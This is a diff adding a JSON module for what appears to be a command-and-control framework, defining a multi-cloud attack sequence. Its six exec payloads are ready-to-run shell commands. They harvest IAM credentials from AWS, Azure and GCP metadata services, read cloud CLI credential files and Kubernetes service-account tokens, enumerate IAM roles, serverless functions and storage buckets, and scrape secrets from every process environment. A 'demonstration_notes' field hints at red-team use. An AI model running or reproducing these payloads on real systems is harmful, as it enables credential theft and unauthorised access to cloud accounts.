@@ -1,0 +1,73 @@
+{
+  "id": "cloud_infrastructure_attack",
+  "name": "Multi-Cloud Infrastructure Exploitation",
+  "description": "Advanced cloud-native attack sequences targeting AWS, Azure, and GCP with metadata service exploitation, IAM privilege escalation, and serverless function injection",
+  "version": "2.0",
+  "author": "SecureComm C2 - CloudOps",
+  "category": "cloud-attack",
+  "platform": "cross-platform",
+  "risk_level": "critical",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' 2>/dev/null || curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null; echo 'Metadata service enumeration complete'",
+      "description": "Cloud metadata service exploitation - IAM credential harvesting",
+      "timeout": 30,
+      "cloud_technique": "metadata_exploitation"
+    },
+    {
+      "type": "exec",
+      "payload": "aws sts get-caller-identity 2>/dev/null || az account show 2>/dev/null || gcloud auth list 2>/dev/null; cat ~/.aws/credentials 2>/dev/null | head -20; cat ~/.azure/azureProfile.json 2>/dev/null | jq -r '.subscriptions[0]' 2>/dev/null",
+      "description": "Cloud CLI credential extraction and identity validation",
+      "timeout": 45,
+      "cloud_technique": "credential_harvesting"
+    },
+    {
+      "type": "exec",
+      "payload": "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) 2>/dev/null || az role assignment list --assignee $(az account show --query user.name -o tsv) 2>/dev/null",
+      "description": "IAM privilege enumeration and role mapping",
+      "timeout": 60,
+      "cloud_technique": "privilege_discovery"
+    },
+    {
+      "type": "exec",
+      "payload": "aws lambda list-functions --max-items 50 2>/dev/null || az functionapp list 2>/dev/null || gcloud functions list 2>/dev/null; aws s3api list-buckets 2>/dev/null | jq -r '.Buckets[].Name' | head -10",
+      "description": "Serverless function discovery and storage enumeration",
+      "timeout": 90,
+      "cloud_technique": "serverless_enumeration"
+    },
+    {
+      "type": "exec",
+      "payload": "kubectl get nodes --all-namespaces 2>/dev/null || echo 'No k8s access'; docker ps -a 2>/dev/null | wc -l; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | base64 -d 2>/dev/null | head -c 100",
+      "description": "Container orchestration access validation and token extraction",
+      "timeout": 45,
+      "cloud_technique": "k8s_token_harvest"
+    },
+    {
+      "type": "exec",
+      "payload": "env | grep -E 'AWS_|AZURE_|GOOGLE_|KUBE_|DOCKER_' | head -20; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -E 'SECRET|KEY|TOKEN|PWD' | head -10",
+      "description": "Environment variable credential mining across processes",
+      "timeout": 30,
+      "cloud_technique": "env_credential_mining"
+    }
+  ],
+  "cloud_targets": {
+    "aws": ["ec2", "lambda", "s3", "iam", "rds", "eks"],
+    "azure": ["vm", "functions", "storage", "aad", "aks"],
+    "gcp": ["compute", "cloud-functions", "gcs", "iam", "gke"]
+  },
+  "attack_vectors": [
+    "metadata_service_exploitation",
+    "iam_privilege_escalation",
+    "serverless_function_injection",
+    "container_escape_to_cloud",
+    "cross_cloud_lateral_movement"
+  ],
+  "cloud_native_tools": ["aws-cli", "az-cli", "gcloud", "kubectl", "docker"],
+  "mitre_techniques": ["T1552", "T1078", "T1098", "T1071", "T1526"],
+  "tags": ["cloud", "aws", "azure", "gcp", "multi-cloud", "iam", "serverless", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "Modern cloud infrastructure targeting with metadata exploitation and cross-platform cloud attacks"
+}
